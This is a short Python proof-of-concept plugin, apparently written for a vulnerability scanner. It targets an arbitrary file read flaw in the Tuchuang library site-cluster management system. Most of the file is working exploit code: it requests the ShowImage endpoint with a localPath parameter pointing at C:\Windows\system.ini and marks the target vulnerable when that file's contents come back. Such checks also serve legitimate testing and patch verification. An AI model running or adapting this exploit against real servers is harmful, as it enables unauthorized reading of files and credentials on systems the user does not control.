#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = ["https://peiqi.wgpsec.org/wiki/webapp/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6%20%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html"]
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "图创软件 图书馆站群管理系统 任意文件读取漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = "/interlib/report/ShowImage?localPath=C:\\Windows\\system.ini"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "for 16-bit app support" in res.text:
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret